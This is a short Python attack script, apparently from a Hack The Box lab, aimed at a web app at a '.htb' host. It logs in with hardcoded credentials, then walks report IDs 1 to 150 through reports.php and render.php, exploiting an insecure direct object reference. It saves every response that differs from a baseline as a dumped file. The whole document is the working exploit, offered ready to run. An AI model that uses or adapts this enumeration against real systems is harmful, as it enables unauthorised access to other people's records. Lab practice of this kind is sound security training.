#!/usr/bin/env python3
import requests

TARGET = "http://storage.vitamedix.htb"
USERNAME = "henry"
PASSWORD = "H3nry_V@ulT_d3v!"

s = requests.Session()

print("Logging in")
s.get(f"{TARGET}/index.php")
s.post(f"{TARGET}/index.php", data={"Username": USERNAME, "Password": PASSWORD, "Submit": "Submit"})

s.get(f"{TARGET}/reports.php?id=999999", allow_redirects=False)
baseline = len(s.get(f"{TARGET}/render.php", allow_redirects=False).text)
print(f"Baseline: {baseline} bytes")

print("Searching the first 150 file IDs")
for i in range(1, 151):
    s.get(f"{TARGET}/reports.php?id={i}", allow_redirects=False)
    r = s.get(f"{TARGET}/render.php", allow_redirects=False)
    
    if len(r.text) != baseline:
        print(f"ID {i}: {len(r.text)} bytes -> dump_{i}.html")
        with open(f"dump_{i}.html", "w") as f:
            f.write(r.text)
